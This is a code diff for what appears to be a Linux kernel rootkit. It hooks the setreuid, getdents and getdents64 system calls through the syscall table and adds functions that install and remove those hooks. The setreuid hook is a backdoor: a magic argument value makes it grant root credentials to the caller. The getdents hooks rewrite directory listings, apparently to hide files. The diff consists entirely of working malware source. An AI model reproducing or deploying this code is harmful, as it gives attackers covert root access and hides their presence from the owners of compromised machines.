@@ -6,8 +6,8 @@
 #include <asm/uaccess.h>
 
 // Commander
-asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
-asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
+asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
+asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid)
 {
     DEBUG("[trying]: ruid == %d && euid == %d\n", ruid, euid);
 
@@ -17,16 +17,16 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
         {
             case CMD_ROOT:
                 commit_creds(prepare_kernel_cred(0));
-                return new_setreuid(0, 0);
+                return n_sys_setreuid(0, 0);
             break;
         }
     }
 
-    return orig_setreuid(ruid, euid);
+    return sys_setreuid(ruid, euid);
 }
 
-asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
+asmlinkage int (*sys_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
+asmlinkage int n_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
     int ret, i, j;
     char *buf, *userp;
@@ -43,7 +43,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent __user *dirp, u
 
     old_fs = get_fs();
     set_fs(KERNEL_DS);
-    ret = orig_getdents(fd, (struct linux_dirent *)buf, count);
+    ret = sys_getdents(fd, (struct linux_dirent *)buf, count);
     set_fs(old_fs);
 
     for(i = j = 0; i < ret; i += p->d_reclen)
@@ -73,8 +73,8 @@ end:
     return ret;
 }
 
-asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
+asmlinkage int (*sys_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int n_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 {
     int ret, i, j;
     char *buf, *userp;
@@ -91,7 +91,7 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
 
     old_fs = get_fs();
     set_fs(KERNEL_DS);
-    ret = orig_getdents64(fd, (struct linux_dirent64 *)buf, count);
+    ret = sys_getdents64(fd, (struct linux_dirent64 *)buf, count);
     set_fs(old_fs);
 
     for(i = j = 0; i < ret; i += p->d_reclen)
@@ -119,4 +119,26 @@ end:
     kfree(buf);
 
     return ret;
+}
+
+void init_hooks(void)
+{
+    DEBUG("Hooking syscalls\n");
+    sys_setreuid = (void *)sct[__NR_setreuid];
+    hook_start(sys_setreuid, &n_sys_setreuid);
+
+    sys_getdents = (void *)sct[__NR_getdents];
+    hook_start(sys_getdents, &n_sys_getdents);
+
+    sys_getdents64 = (void *)sct[__NR_getdents64];
+    hook_start(sys_getdents64, &n_sys_getdents64);
+}
+
+void exit_hooks(void)
+{
+    DEBUG("Unhooking syscalls\n");
+
+    hook_stop(sys_setreuid);
+    hook_stop(sys_getdents);
+    hook_stop(sys_getdents64);
 }
